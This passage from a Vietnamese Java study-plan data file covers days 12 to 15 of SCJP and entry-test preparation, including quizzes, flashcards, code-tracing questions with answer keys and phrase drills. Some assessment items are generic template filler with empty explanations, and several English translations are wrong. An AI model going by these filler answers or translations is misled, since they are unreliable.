              "q": "Tại sao việc gọi một phương thức có thể bị override từ bên trong constructor của class cha lại được xem là cấm kỵ (antipattern) trong Java?",
              "ans": "Vì khi constructor cha chạy, đối tượng con CHƯA được khởi tạo (các trường của lớp con vẫn đang mang giá trị mặc định 0/null). Nếu phương thức bị con override truy cập vào các trường này, nó sẽ đọc phải dữ liệu rác hoặc gây NullPointerException."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_12_1",
          "q": "Nếu trong một class ta tự viết một constructor có tham số: `MyClass(int x) {}`, compiler Java có tự động sinh constructor mặc định không tham số `MyClass() {}` nữa không?",
          "options": [
            "Hoàn toàn KHÔNG, compiler chỉ sinh constructor mặc định khi class KHÔNG CÓ BẤT KỲ constructor nào",
            "Có, compiler luôn tự động sinh constructor không tham số trong mọi trường hợp",
            "Chỉ sinh khi class đó là public",
            "Chỉ sinh khi class đó có implements Serializable"
          ],
          "correct": 0,
          "exp": "Quy tắc vàng của Java: Compiler chỉ tự động cung cấp default constructor không tham số khi và chỉ khi lập trình viên KHÔNG VIẾT BẤT KỲ constructor nào trong class."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Hiện tượng Method Hiding (Ẩn phương thức) xảy ra khi nào?",
          "a": "Khi lớp con khai báo phương thức `static` có cùng signature với phương thức `static` của lớp cha. Phương thức static KHÔNG THỂ bị Override, chỉ bị Hide. Quyết định gọi hàm static nào dựa vào kiểu con trỏ ở Compile-time!",
          "trap": "Cha có method `static`, con khai báo lại method đó nhưng bỏ chữ `static` (hoặc ngược lại) sẽ bị Compile Error."
        },
        {
          "q": "Biểu thức `null instanceof AnyClass` trả về kết quả gì?",
          "a": "Luôn luôn trả về `false`, không bao giờ ném ngoại lệ NullPointerException.",
          "trap": "Bẫy câu hỏi trắc nghiệm hay hỏi `null instanceof Object` -> Đáp án đúng là false!"
        },
        {
          "q": "Variable Shadowing (Che khuất biến) trong quan hệ kế thừa hoạt động ra sao?",
          "a": "Khi lớp con khai báo biến trùng tên với lớp cha, biến của cha bị che khuất. Truy cập biến luôn luôn giải quyết theo kiểu của biến tham chiếu (Reference type) tại Compile-time, hoàn toàn KHÔNG có tính đa hình runtime!",
          "trap": "`Parent p = new Child(); System.out.println(p.x);` luôn in ra giá trị biến `x` của Parent!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 34,
          "vi": "Đặt giá trị cho biến",
          "en": "Assign values to variables"
        },
        {
          "id": 35,
          "vi": "Khởi tạo đối tượng connection",
          "en": "Initialize connection object"
        },
        {
          "id": 36,
          "vi": "Câu truy vấn sql không thực hiện được",
          "en": "SQL  statement can not be executed"
        },
        {
          "id": 37,
          "vi": "Lấy danh sách theo điều kiện gán",
          "en": "Get list by assigning condition"
        },
        {
          "id": 38,
          "vi": "Set giá trị cho biến từ danh sách được lấy từ db",
          "en": "Assign values to variabes from list in database"
        }
      ],
      "chapter": "Chapter 5: OOP - Constructors & Object Casting"
    },
    "13": {
      "day": 13,
      "week": 2,
      "title": "Tổng hợp & Luyện đề Chapter 1-5",
      "topics": [
        "Tổng hợp kiến thức nền tảng từ Ch1 đến Ch5"
      ],
      "tasks": [
        "Làm 50 câu TestKing tổng hợp Ch1-5",
        "Ghi lại mọi bẫy OOP vào Error Notebook",
        "Luyện 5 câu Comment Code"
      ],
      "englishDrill": [
        {
          "id": 37,
          "vi": "Lấy danh sách theo điều kiện gán",
          "en": "Get list by assigning condition"
        },
        {
          "id": 38,
          "vi": "Set giá trị cho biến từ danh sách được lấy từ db",
          "en": "Assign values to variabes from list in database"
        },
        {
          "id": 39,
          "vi": "Kiểm tra nêu dữ liệu lấy là là rỗng thì sẽ export hết tất cả danh sách, ngược lại thì sẽ export theo dữ liệu được lấy về",
          "en": "Check if taken data is null, export all list, else, export by data"
        },
        {
          "id": 40,
          "vi": "Lấy dữ liệu về và kiểm tra nếu loại là C thì sẽ vào cập nhật và nếu là D thì sẽ là xóa, còn lại sẽ báo lỗi",
          "en": "if value of ... is D, delete, else C, update"
        },
        {
          "id": 41,
          "vi": "Lấy dữ liệu của mảng đối tượng khi submit từ jsp lên form",
          "en": "Get data of object classes when submitting from jsp into form"
        }
      ],
      "summary": "Tổng ôn Chapter 1-5: Rà soát nền tảng vững chắc trước khi sang String & Collections.",
      "coreTheory": "\n### Danh mục kiểm tra kiến thức Ch1-5:\n- [x] Ch1: 49 keywords, primitive bit ranges, literal rules, default values.\n- [x] Ch2: 4 access modifiers, abstract/final class, interface constants.\n- [x] Ch3: ++/-- prefix postfix, short-circuit &&/||, numeric promotion.\n- [x] Ch4: switch types, fall-through, try-catch-finally execution order.\n- [x] Ch5: Encapsulation, Overloading vs Overriding 4 quy tắc, constructors super()/this().\n",
      "codeSnippet": "// Đề luyện 50 câu TestKing tổng hợp",
      "traps": [
        "Ghi chú lại ít nhất 10 câu sai vào Error Book."
      ],
      "quickQuiz": [
        {
          "q": "Cú pháp `(Dog) animal` khi `animal` thực tế đang trỏ tới một `Cat` object sẽ xảy ra hiện tượng gì ở thời điểm compile và runtime?",
          "a": "Compile thành công (vì Dog và Animal có quan hệ kế thừa IS-A), nhưng lúc Runtime sẽ ném `java.lang.ClassCastException` vì Cat không thể ép kiểu sang Dog."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Tổng hợp kiến thức nền tảng từ Ch1 đến Ch5.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Danh mục kiểm tra kiến thức Ch1-5:\n- [x] Ch1: 49 keywords, primitive bit ranges, literal rules, default values.\n- [x] Ch2: 4 access modifiers, abstract/final class, interface constants.\n- [x] Ch3: ++/-- prefix postfix, short-circuit &&/||, numeric promotion.\n- [x] Ch4: switch types, fall-through, try-catch-finally execution order.\n- [x] Ch5: Encapsulation, Overloading vs Overriding 4 quy tắc, constructors super()/this().\n",
          "code": "// Đề luyện 50 câu TestKing tổng hợp"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d13_1",
          "level": "Hard",
          "question": "Đoạn code ép kiểu đa hình sau cho kết quả gì?",
          "code": "class Animal { }\nclass Dog extends Animal { }\nclass Cat extends Animal { }\npublic class CastTest {\n    public static void main(String[] args) {\n        Animal a = new Dog();\n        Dog d = (Dog) a;\n        System.out.print(\"Pass1 \");\n        try {\n            Cat c = (Cat) a;\n            System.out.print(\"Pass2 \");\n        } catch (ClassCastException e) {\n            System.out.print(\"CatchCCE \");\n        }\n    }\n}",
          "options": [
            "Pass1 CatchCCE ",
            "Pass1 Pass2 ",
            "Compile Error tại dòng (Cat) a",
            "Chỉ in Pass1 rồi crash"
          ],
          "correctIndex": 0,
          "explanation": "1. `a` tham chiếu đến đối tượng `Dog` trên Heap. Ép kiểu `(Dog) a` hoàn toàn hợp lệ, in ra `Pass1 `.\n2. Cố tình ép `(Cat) a` hợp lệ khi compile (vì Cat và Animal có quan hệ kế thừa), nhưng ở Runtime JVM kiểm tra thấy đối tượng thực tế là Dog chứ không phải Cat, nên ném ngoại lệ `ClassCastException`.\n3. Khối catch bắt được ngoại lệ và in ra `CatchCCE `."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Ghi chú lại ít nhất 10 câu sai vào Error Book.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Đề luyện 50 câu TestKing tổng hợp",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Ép kiểu đối tượng (Casting)",
          "questions": [
            {
              "q": "Upcasting (ép kiểu lên cha) và Downcasting (ép kiểu xuống con) trường hợp nào yêu cầu toán tử ép kiểu tường minh `(SubClass)`?",
              "ans": "Downcasting bắt buộc phải có toán tử ép kiểu tường minh `(SubClass)`. Upcasting diễn ra tự động và an toàn (implicit)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Toán tử instanceof và ClassCastException",
          "questions": [
            {
              "q": "Toán tử `instanceof` kiểm tra điều gì và `null instanceof Object` trả về kết quả gì?",
              "ans": "`instanceof` kiểm tra xem đối tượng thực tế trên Heap có quan hệ IS-A với kiểu dữ liệu được chỉ định hay không. Biểu thức `null instanceof AnyClass` luôn trả về `false` mà không ném lỗi."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Downcasting hợp lệ vs không hợp lệ",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Animal {}\nclass Dog extends Animal {}\npublic class Test {\n    public static void main(String[] args) {\n        Animal a = new Animal();\n        Dog d = (Dog) a;\n    }\n}\n```\nĐoạn code này biên dịch và chạy như thế nào?",
              "ans": "Biên dịch thành công (vì Animal và Dog có quan hệ kế thừa), nhưng khi chạy (Runtime) sẽ ném ngoại lệ: `java.lang.ClassCastException` vì đối tượng thực tế trên Heap là `Animal`, không thể ép kiểu thành `Dog`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy ép kiểu giữa hai class không cùng nhánh",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nString s = \"Hello\";\nInteger i = (Integer) s;\n```\nĐoạn code này lỗi lúc nào?",
              "ans": "Lỗi Compile Error: `inconvertible types: java.lang.String cannot be converted to java.lang.Integer`. Hai class hoàn toàn độc lập không có quan hệ kế thừa IS-A với nhau thì trình biên dịch cấm ngay từ lúc compile."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Pattern matching for instanceof (Java 14+)",
          "questions": [
            {
              "q": "Cú pháp `if (obj instanceof String s)` giúp loại bỏ dòng code nào so với Java truyền thống?",
              "ans": "Loại bỏ dòng ép kiểu tường minh `String s = (String) obj;`. Biến `s` được khai báo và tự động gán ngay trong điều kiện if nếu khớp kiểu."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_13_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Tổng hợp kiến thức nền tảng từ Ch1 đến Ch5?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Tổng hợp kiến thức nền tảng từ Ch1 đến Ch5 phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Tổng hợp kiến thức nền tảng từ Ch1 đến Ch5."
        },
        {
          "id": "da_13_2",
          "q": "Khi thao tác với Tổng hợp kiến thức nền tảng từ Ch1 đến Ch5, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Khi nào JVM ném `ClassCastException` ở Runtime?",
          "a": "Khi ta ép kiểu con trỏ tham chiếu sang một kiểu class mà đối tượng thực tế trên Heap không có quan hệ kế thừa (không phải là instance của class đó).",
          "trap": "`Animal a = new Dog(); Cat c = (Cat) a;` biên dịch qua nhưng chạy ném ClassCastException vì đối tượng thật là Dog."
        },
        {
          "q": "Constructor có được khai báo từ khóa `static`, `final`, hoặc `abstract` không?",
          "a": "KHÔNG ĐƯỢC. Constructor không thể là static (vì nó tạo instance), không thể là final hay abstract (vì nó không được kế thừa để override).",
          "trap": "Thấy constructor có `void` thì nó biến thành method thông thường, không còn là constructor nữa!"
        },
        {
          "q": "Một interface có thể kế thừa (extends) nhiều interface khác cùng lúc không?",
          "a": "CÓ. Trong Java, một interface có thể `extends` cùng lúc nhiều interface khác (`interface C extends A, B`). Chỉ có class là đơn kế thừa class khác.",
          "trap": "Nhiều người nhớ máy móc 'Java không có đa kế thừa' mà quên mất Interface hỗ trợ đa kế thừa interface!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 37,
          "vi": "Lấy danh sách theo điều kiện gán",
          "en": "Get list by assigning condition"
        },
        {
          "id": 38,
          "vi": "Set giá trị cho biến từ danh sách được lấy từ db",
          "en": "Assign values to variabes from list in database"
        },
        {
          "id": 39,
          "vi": "Kiểm tra nêu dữ liệu lấy là là rỗng thì sẽ export hết tất cả danh sách, ngược lại thì sẽ export theo dữ liệu được lấy về",
          "en": "Check if taken data is null, export all list, else, export by data"
        },
        {
          "id": 40,
          "vi": "Lấy dữ liệu về và kiểm tra nếu loại là C thì sẽ vào cập nhật và nếu là D thì sẽ là xóa, còn lại sẽ báo lỗi",
          "en": "if value of ... is D, delete, else C, update"
        },
        {
          "id": 41,
          "vi": "Lấy dữ liệu của mảng đối tượng khi submit từ jsp lên form",
          "en": "Get data of object classes when submitting from jsp into form"
        }
      ]
    },
    "14": {
      "day": 14,
      "week": 2,
      "title": "Mini Mock Test #1 (20 câu Java Core)",
      "topics": [
        "Kiểm tra đánh giá mốc 2 tuần"
      ],
      "tasks": [
        "Làm bài thi thử 20 câu Java Core (30 phút)",
        "Đánh giá điểm: <12 học lại, 12-15 ổn, 16-17 khá, 18+ tốt",
        "Rà soát các câu sai"
      ],
      "englishDrill": [
        {
          "id": 40,
          "vi": "Lấy dữ liệu về và kiểm tra nếu loại là C thì sẽ vào cập nhật và nếu là D thì sẽ là xóa, còn lại sẽ báo lỗi",
          "en": "if value of ... is D, delete, else C, update"
        },
        {
          "id": 41,
          "vi": "Lấy dữ liệu của mảng đối tượng khi submit từ jsp lên form",
          "en": "Get data of object classes when submitting from jsp into form"
        },
        {
          "id": 42,
          "vi": "Thực hiện lấy dữ liệu combobox theo các giá trị được lấy phía trước",
          "en": "Get data of combobox by values taken before"
        },
        {
          "id": 43,
          "vi": "- Hàm kiểm tra 1 đối tượng có tồn tại ít nhát 1 thuộc tính rỗng",
          "en": "Function of checking 1 object which exists at least 1 property"
        },
        {
          "id": 44,
          "vi": "Xử lý sự kiện khi người dùng click vào button XXX",
          "en": "Process event when user clicks button XXX"
        }
      ],
      "summary": "MINI MOCK TEST #1 (20 câu Java Core Ch1-5). Đánh giá mốc 2 tuần đầu.",
      "coreTheory": "\n### Thang điểm đánh giá Mock #1:\n- **< 12 / 20 câu:** Cần ôn lại ngay Ch1-5, đặc biệt là Access control và Overriding.\n- **12 - 15 / 20 câu:** Nền tảng ổn, cần cẩn thận hơn với các bẫy nhỏ.\n- **16 - 17 / 20 câu:** Khá, tư duy đọc code tốt.\n- **18+ / 20 câu:** Xuất sắc, sẵn sàng sang tuần 3!\n",
      "codeSnippet": "// Mở Tab Quiz trên Web App để thi thử Mock Exam 20 câu",
      "traps": [
        "Không được dùng Google hay AI khi làm bài thi thử."
      ],
      "quickQuiz": [
        {
          "q": "Trong khối `try-catch-finally`, nếu khối `try` có `return 10;` còn khối `finally` có `return 20;`, giá trị thực tế phương thức trả về là bao nhiêu?",
          "a": "Trả về 20! Lệnh `return` trong khối `finally` sẽ ghi đè hoàn toàn (overwrite) giá trị trả về trước đó của khối `try`."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Kiểm tra đánh giá mốc 2 tuần.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Thang điểm đánh giá Mock #1:\n- **< 12 / 20 câu:** Cần ôn lại ngay Ch1-5, đặc biệt là Access control và Overriding.\n- **12 - 15 / 20 câu:** Nền tảng ổn, cần cẩn thận hơn với các bẫy nhỏ.\n- **16 - 17 / 20 câu:** Khá, tư duy đọc code tốt.\n- **18+ / 20 câu:** Xuất sắc, sẵn sàng sang tuần 3!\n",
          "code": "// Mở Tab Quiz trên Web App để thi thử Mock Exam 20 câu"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d14_1",
          "level": "Hard",
          "question": "Kết quả in ra của khối xử lý ngoại lệ và finally lồng nhau sau là gì?",
          "code": "public class ExceptionTrace {\n    public static int compute() {\n        try {\n            int x = 10 / 0;\n            return 1;\n        } catch (ArithmeticException e) {\n            return 2;\n        } finally {\n            return 3;\n        }\n    }\n    public static void main(String[] args) {\n        System.out.println(compute());\n    }\n}",
          "options": [
            "3",
            "2",
            "1",
            "Ném ArithmeticException ra ngoài"
          ],
          "correctIndex": 0,
          "explanation": "1. `10 / 0` ném `ArithmeticException`, nhảy vào khối `catch`.\n2. Khối catch chuẩn bị trả về `2`.\n3. Tuy nhiên, khối `finally` LUÔN LUÔN được thực thi trước khi phương thức kết thúc. Trong finally có lệnh `return 3;`, lệnh return này sẽ ghi đè và nuốt chửng hoàn toàn lệnh return trước đó!\n4. Kết quả in ra là: 3."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Không được dùng Google hay AI khi làm bài thi thử.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Mở Tab Quiz trên Web App để thi thử Mock Exam 20 câu",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Tổng hợp Đa hình và Ngoại lệ",
          "questions": [
            {
              "q": "Một phương thức ở class con khi override có được ném thêm ngoại lệ loại `RuntimeException` mới không?",
              "ans": "Hoàn toàn được phép! Quy tắc giới hạn checked exception khi override chỉ áp dụng cho Checked Exception, không áp dụng cho Unchecked Exception (`RuntimeException`)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Đa hình tham số (Method Overloading) vs Overriding",
          "questions": [
            {
              "q": "Việc lựa chọn phương thức nào trong Overloading được quyết định ở thời điểm nào: Compile-time hay Runtime?",
              "ans": "Được quyết định ở thời điểm Biên dịch (Compile-time) dựa trên kiểu khai báo của các tham số (Static Polymorphism)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Overloading với kiểu tham số null",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\npublic class Test {\n    public static void print(Object o) { System.out.print(\"Object \"); }\n    public static void print(String s) { System.out.print(\"String \"); }\n    public static void main(String[] args) {\n        print(null);\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `String `. Khi có nhiều phương thức nạp chồng chấp nhận giá trị `null`, Java sẽ ưu tiên gọi phương thức có kiểu tham số cụ thể nhất (most specific type). Vì `String` là lớp con của `Object`, `print(String)` được chọn."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy Overloading ambiguous khi có 2 nhánh ngang hàng",
          "questions": [
            {
              "q": "Nếu trong ví dụ trên có thêm hàm `public static void print(Integer i)`, thì khi gọi `print(null)` kết quả là gì?",
              "ans": "Compile Error: `reference to print is ambiguous`. Cả `String` và `Integer` đều là lớp con của `Object` nhưng ngang hàng nhau, compiler không thể xác định kiểu nào cụ thể hơn."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Thứ tự ưu tiên khi binding phương thức nạp chồng",
          "questions": [
            {
              "q": "Khi truyền một giá trị `int 5` vào phương thức, thứ tự ưu tiên lựa chọn phiên bản nạp chồng của compiler là gì giữa: Widening (`long`), Autoboxing (`Integer`), Varargs (`int...`)?",
              "ans": "Thứ tự ưu tiên chuẩn của Java: 1) Exact match -> 2) Widening (nới rộng kiểu nguyên thủy: `long`) -> 3) Autoboxing (`Integer`) -> 4) Varargs (`int...`)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_14_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Kiểm tra đánh giá mốc 2 tuần?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Kiểm tra đánh giá mốc 2 tuần phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Kiểm tra đánh giá mốc 2 tuần."
        },
        {
          "id": "da_14_2",
          "q": "Khi thao tác với Kiểm tra đánh giá mốc 2 tuần, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Một interface có thể chứa biến có modifier nào?",
          "a": "Mọi biến khai báo trong interface mặc định và bắt buộc luôn là `public static final` (hằng số), dù có ghi từ khóa hay không. Không thể khai báo biến private, protected hay non-final.",
          "trap": "Cố tình viết `int x;` trong interface mà không gán giá trị sẽ bị lỗi Compile Error vì hằng số bắt buộc khởi tạo."
        },
        {
          "q": "Default method trong interface (từ Java 8) có mục đích gì?",
          "a": "Cho phép bổ sung phương thức mới có sẵn thân hàm (`default void foo() { ... }`) vào interface mà không làm gãy (break) mã nguồn của các class cũ đã implement interface đó.",
          "trap": "Nếu class implement 2 interface có cùng default method thì bắt buộc phải override lại để giải quyết xung đột (Diamond problem)."
        },
        {
          "q": "Lớp trừu tượng (Abstract Class) có bắt buộc phải chứa abstract method không?",
          "a": "KHÔNG. Abstract class có thể có 0 abstract method nào, hoặc có thể chứa toàn bộ concrete method có thân hàm đầy đủ. Nhưng hễ có ít nhất 1 abstract method thì class bắt buộc phải khai báo là `abstract`.",
          "trap": "Khai báo class thường (non-abstract) chứa 1 abstract method sẽ bị Compile Error ngay."
        }
      ],
      "dailyEnglish": [
        {
          "id": 40,
          "vi": "Lấy dữ liệu về và kiểm tra nếu loại là C thì sẽ vào cập nhật và nếu là D thì sẽ là xóa, còn lại sẽ báo lỗi",
          "en": "if value of ... is D, delete, else C, update"
        },
        {
          "id": 41,
          "vi": "Lấy dữ liệu của mảng đối tượng khi submit từ jsp lên form",
          "en": "Get data of object classes when submitting from jsp into form"
        },
        {
          "id": 42,
          "vi": "Thực hiện lấy dữ liệu combobox theo các giá trị được lấy phía trước",
          "en": "Get data of combobox by values taken before"
        },
        {
          "id": 43,
          "vi": "- Hàm kiểm tra 1 đối tượng có tồn tại ít nhát 1 thuộc tính rỗng",
          "en": "Function of checking 1 object which exists at least 1 property"
        },
        {
          "id": 44,
          "vi": "Xử lý sự kiện khi người dùng click vào button XXX",
          "en": "Process event when user clicks button XXX"
        }
      ]
    },
    "15": {
      "day": 15,
      "week": 3,
      "title": "Chapter 6: String, StringBuffer, Immutability",
      "topics": [
        "String immutability & String Constant Pool",
        "String s = new String(\"abc\") tạo bao nhiêu objects?",
        "== (tham chiếu) vs equals() (nội dung)",
        "StringBuffer & StringBuilder (mutable, thread-safety)",
        "String methods: concat, substring, replace, trim, length"
      ],
      "tasks": [
        "Viết code test các trường hợp String Pool với toán tử +",
        "Làm 20 câu String trong TestKing"
      ],
      "englishDrill": [
        {
          "id": 43,
          "vi": "- Hàm kiểm tra 1 đối tượng có tồn tại ít nhát 1 thuộc tính rỗng",
          "en": "Function of checking 1 object which exists at least 1 property"
        },
        {
          "id": 44,
          "vi": "Xử lý sự kiện khi người dùng click vào button XXX",
          "en": "Process event when user clicks button XXX"
        },
        {
          "id": 45,
          "vi": "- Chuyển đổi biến A có kiểu dữ liệu  BBB  sang biến C có kiểu dữ liệu DDD",
          "en": "Convert variable A with BBB data type to variable C with DDD data type"
        },
        {
          "id": 46,
          "vi": "Lấy ra đối tượng với tham số truyền vào",
          "en": "Get objects with inputted parameter"
        },
        {
          "id": 47,
          "vi": "Tạo mới 1 mảng bằng cách cắt chuỗi với tham số truyền vào (split())",
          "en": "Create 1 class by cutting string with inputted parameter"
        }
      ],
      "summary": "Chapter 6: String, String Constant Pool, Immutability & StringBuffer/StringBuilder.",
      "coreTheory": "\n### 1. Tính Bất Biến (Immutability) & String Constant Pool\n- Đối tượng `String` là **bất biến (immutable)**. Mọi thao tác nối chuỗi, substring đều tạo ra một đối tượng String mới.\n- Chuỗi literal `String s = \"abc\";` được lưu trong **String Constant Pool** và tái sử dụng.\n- `String s = new String(\"abc\");` tạo một đối tượng mới tinh trên **Heap** (không dùng chung địa chỉ pool).\n- `==` so sánh địa chỉ tham chiếu vùng nhớ, `.equals()` so sánh nội dung ký tự.\n\n### 2. StringBuilder vs StringBuffer\n- Cả hai đều là chuỗi **có thể biến đổi (mutable)**.\n- `StringBuffer`: Các method có từ khóa `synchronized` $\\rightarrow$ **Thread-safe**, nhưng tốc độ chậm hơn.\n- `StringBuilder`: Không đồng bộ $\\rightarrow$ **Non-thread-safe**, tốc độ xử lý nhanh hơn, khuyến khích dùng trong môi trường đơn luồng.\n",
      "codeSnippet": "String s1 = \"Java\";\nString s2 = \"Java\";\nString s3 = new String(\"Java\");\n\nSystem.out.println(s1 == s2);      // true (cùng pool)\nSystem.out.println(s1 == s3);      // false (khác địa chỉ heap)\nSystem.out.println(s1.equals(s3)); // true (cùng nội dung)",
      "traps": [
        "Gọi `s.concat(\"def\")` mà không gán lại `s = s.concat(...)` thì s ban đầu giữ nguyên.",
        "Nối hằng chuỗi `\"Ja\" + \"va\"` được compiler tối ưu lúc compile trỏ vào pool."
      ],
      "quickQuiz": [
        {
          "q": "`String s = new String(\"hello\");` tạo mấy object?",
          "a": "1 hoặc 2 object (1 trên heap, 1 trong pool nếu pool chưa có)."
        }
      ],
      "estimatedTime": "3h 30m",
      "difficulty": "⭐⭐⭐",
      "priority": "🔴 MUST KNOW (Trọng Tâm SCJP & Phỏng Vấn)",
      "source": "SCJP Chapter 6 (Ch06.pdf) & TestKing",
      "objectives": [
        "Hiểu sâu tính bất biến (Immutability) của String và cấu trúc String Constant Pool.",
        "Phân biệt 'new String()' (tạo object Heap) vs 'literal' (lưu trong Pool) và hàm intern().",
        "Phân biệt String vs StringBuffer (synchronized) vs StringBuilder (non-synchronized, hiệu năng cao).",
        "Làm chủ các phương thức cốt lõi: substring, indexOf, trim, replace, charAt."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "partA",
          "title": "Part A: Tính Bất Biến & String Constant Pool",
          "sourceRef": "SCJP Objective 6.1 (Ch06.pdf, Page 4-18)",
          "theory": "\n#### 1. Tính Bất Biến (Immutability):\n- Một khi đối tượng `String` đã được tạo ra trong bộ nhớ, nội dung của nó **hoàn toàn không thể thay đổi**.\n- Các phương thức như `concat()`, `toUpperCase()`, `replace()` đều **TẠO VÀ TRẢ VỀ MỘT ĐỐI TƯỢNG STRING HOÀN TOÀN MỚI**, đối tượng ban đầu giữ nguyên 100%!\n- Ví dụ: `String s = \"abc\"; s.concat(\"def\");` $\\rightarrow$ Nếu không gán `s = s.concat(...)`, thì `s` vẫn là `\"abc\"`!\n\n#### 2. String Constant Pool & intern():\n- `String s1 = \"Java\";`: JVM tìm trong Pool. Nếu chưa có, tạo 1 đối tượng trong Pool.\n- `String s2 = \"Java\";`: Tái sử dụng đối tượng có sẵn trong Pool $\\to$ `s1 == s2` là **`true`**!\n- `String s3 = new String(\"Java\");`: Bắt buộc tạo một đối tượng mới trên Heap độc lập với Pool $\\to$ `s1 == s3` là **`false`**!\n- `s3.intern()`: Trả về tham chiếu của chuỗi tương ứng nằm trong Pool $\\to$ `s1 == s3.intern()` là **`true`**!\n",
